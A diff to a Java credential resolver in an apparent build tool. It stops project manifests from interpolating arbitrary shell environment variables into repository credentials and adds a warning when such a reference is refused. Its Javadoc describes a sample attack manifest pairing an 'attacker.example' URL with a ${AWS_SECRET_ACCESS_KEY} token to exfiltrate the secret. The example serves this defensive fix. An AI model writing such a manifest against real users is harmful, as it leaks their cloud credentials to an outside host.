@@ -3,6 +3,7 @@ package cc.jumpkick.repo;
 
 import cc.jumpkick.config.BuildEnv;
 import cc.jumpkick.config.GlobalConfig;
+import cc.jumpkick.config.Interpolation;
 import cc.jumpkick.config.RepositoryToml;
 import cc.jumpkick.config.ResolvedSecrets;
 import cc.jumpkick.credential.RepoCredential;
@@ -15,10 +16,12 @@ import cc.jumpkick.http.SafeUri;
 import cc.jumpkick.model.RepositorySpec;
 import cc.jumpkick.task.RunNotices;
 import java.net.URI;
+import java.util.LinkedHashSet;
 import java.util.List;
 import java.util.Locale;
 import java.util.Objects;
 import java.util.Optional;
+import java.util.Set;
 import java.util.function.Function;
 import java.util.function.Supplier;
 import org.jspecify.annotations.Nullable;
@@ -36,6 +39,17 @@ import org.jspecify.annotations.Nullable;
  * the user's own {@code ~/.jk/config.toml}, a {@code JK_REPO_<ID>_HOST} variable from the caller's
  * shell, or an id that is itself the host. Anything else is refused with a warning that names the
  * repository, the origin and the source that was not sent.
+ *
+ * <p>An inline {@code ${VAR}} reference reads this machine's environment too, and which manifest
+ * wrote it decides whether it may. The user's own {@code ~/.jk/config.toml} may name any variable.
+ * A project manifest is anyone's: a cloned one declaring {@code url = "https://attacker.example/"}
+ * with {@code token = "${AWS_SECRET_ACCESS_KEY}"} would receive that value in the {@code
+ * Authorization} header of its first resolve. So a project's reference is honoured only for the
+ * repository's own {@code JK_REPO_<ID>_*} names, under the same origin binding as every other
+ * name-keyed source; a user-config declaration of the repository at the same origin supplies its
+ * own credential instead; and any other reference is refused with a warning naming the variable
+ * and the remedies. A literal credential is the declaring manifest's own secret and is used as
+ * written.
  */
 public final class RepoCredentialResolver {
 
@@ -97,7 +111,8 @@ public final class RepoCredentialResolver {
     }
 
     /**
-     * Expand {@code ${VAR}} in an inline credential.
+     * Expand {@code ${VAR}} in an inline credential whose references {@link #inlineCredential} has
+     * already admitted.
      *
      * <p>Strict on purpose: an unset variable is an error rather than an empty string, so a typo
      * fails loudly instead of silently authenticating anonymously against a private repository. The
@@ -143,11 +158,12 @@ public final class RepoCredentialResolver {
     }
 
     private RepoCredential select(@Nullable String repoId, @Nullable URI url, Optional<RepoCredential> inline) {
-        // 1. inline jk.toml — expanding ${VAR} here rather than at parse time, because this
-        // is where the request's environment is in scope. Doing it during the parse made the parse
+        // 1. inline — expanding ${VAR} here rather than at parse time, because this is where the
+        // request's environment is in scope. Doing it during the parse made the parse
         // environment-dependent, so a memoized result served the first caller's values to everyone,
         // and inside the engine it read the daemon's environment instead of the caller's.
-        Optional<RepoCredential> fromInline = inline.map(c -> expand(repoId, c)).filter(c -> !c.isAnonymous());
+        Optional<RepoCredential> fromInline =
+                inline.flatMap(c -> inlineCredential(repoId, url, c)).filter(c -> !c.isAnonymous());
         if (fromInline.isPresent()) return fromInline.get();
 
         // Sources 2–4 are keyed by repo id; skip them when there's no declared
@@ -199,6 +215,93 @@ public final class RepoCredentialResolver {
         if (fromForge.isPresent()) return fromForge.get();
 
         return RepoCredential.ANONYMOUS;
+    }
+
+    /**
+     * The credential an inline declaration contributes, expanded — or empty when its {@code ${VAR}}
+     * references may not be read for this repository, in which case the name-keyed sources get
+     * their turn.
+     *
+     * <p>The resolver sees one merged declaration per id (a project's beats the user's on a name
+     * clash), so provenance is recovered from the user's own list: a user-config declaration of
+     * this repository at this origin is the user's word, and its credential is the one used
+     * whatever the project wrote. Without one, the reference is the project's, and a project may
+     * read only the repository's own {@code JK_REPO_<ID>_*} variables — the ones a user exports for
+     * exactly this purpose — and only when something binds the name to the origin, because
+     * {@code ${JK_REPO_NEXUS_TOKEN}} written beside an attacker's URL is the very redirect the
+     * binding rule exists for.
+     */
+    private Optional<RepoCredential> inlineCredential(
+            @Nullable String repoId, @Nullable URI url, RepoCredential declared) {
+        Set<String> references = referencesIn(declared);
+        if (references.isEmpty()) return Optional.of(declared);
+        Optional<RepoCredential> own = userDeclaration(repoId, url).flatMap(RepositorySpec::credentialOpt);
+        if (own.isPresent()) return Optional.of(expand(repoId, own.get()));
+        if (repoId == null || repoId.isBlank()) return Optional.empty();
+        String prefix = envVarPrefix(repoId);
+        List<String> foreign =
+                references.stream().filter(v -> !v.startsWith(prefix)).toList();
+        if (!foreign.isEmpty()) {
+            refuseProjectReference(repoId, url, foreign);
+            return Optional.empty();
+        }
+        Binding binding = bindingOf(repoId, url);
+        if (binding.bound()) return Optional.of(expand(repoId, declared));
+        refuse(
+                repoId,
+                url,
+                "the " + spelled(references) + " reference of its [repositories." + repoId + "] table",
+                binding);
+        return Optional.empty();
+    }
+
+    /** Every {@code ${VAR}} name the credential's text carries, in order of appearance. */
+    private static Set<String> referencesIn(RepoCredential credential) {
+        Set<String> names = new LinkedHashSet<>();
+        switch (credential) {
+            case RepoCredential.Basic b -> {
+                names.addAll(Interpolation.references(b.username()));
+                names.addAll(Interpolation.references(b.password()));
+            }
+            case RepoCredential.Bearer t -> names.addAll(Interpolation.references(t.token()));
+            case RepoCredential.Anonymous ignored -> {}
+        }
+        return names;
+    }
+
+    /** {@code ${A}, ${B}} — how a reference is spelled back to the user who wrote it. */
+    private static String spelled(Set<String> references) {
+        return String.join(", ", references.stream().map(v -> "${" + v + "}").toList());
+    }
+
+    /** The user's own {@code [repositories.<id>]} declaration at this origin, when there is one. */
+    private Optional<RepositorySpec> userDeclaration(@Nullable String repoId, @Nullable URI url) {
+        if (repoId == null || repoId.isBlank() || url == null || url.getHost() == null) return Optional.empty();
+        for (RepositorySpec spec : userRepositories.get()) {
+            if (spec.name().equals(repoId) && Http.sameOrigin(spec.url(), url)) return Optional.of(spec);
+        }
+        return Optional.empty();
+    }
+
+    /**
+     * Once per run per (repository, origin, variables): a project manifest asked for a variable of
+     * the user's shell, and did not get it. Names the variable and every way the user can send a
+     * credential without letting a manifest choose which one — never the value.
+     */
+    private static void refuseProjectReference(String repoId, @Nullable URI url, List<String> variables) {
+        String origin = originText(url);
+        String refs = spelled(new LinkedHashSet<>(variables));
+        RunNotices.warnOnce("repo-credential-refused:" + repoId + " " + origin + " inline " + refs, () -> {
+            String prefix = envVarPrefix(repoId);
+            return "jk: warning: repository `" + repoId + "` at " + origin
+                    + " is accessed anonymously: its [repositories." + repoId + "] table interpolates " + refs
+                    + ", and a project manifest may not read a variable of your shell into a credential — a "
+                    + "cloned project could name any of them. To send one, declare [repositories." + repoId
+                    + "] with this URL and the ${VAR} reference in ~/.jk/config.toml, export " + prefix + "TOKEN (or "
+                    + prefix + "USERNAME + " + prefix + "PASSWORD) with " + prefix + "HOST="
+                    + (url == null || url.getHost() == null ? "<host>" : hostPort(url)) + ", or run `jk repo login "
+                    + repoId + " --url " + SafeUri.forMessage(url) + "`. See repositories.md § Credentials.";
+        });
     }
 
     /**
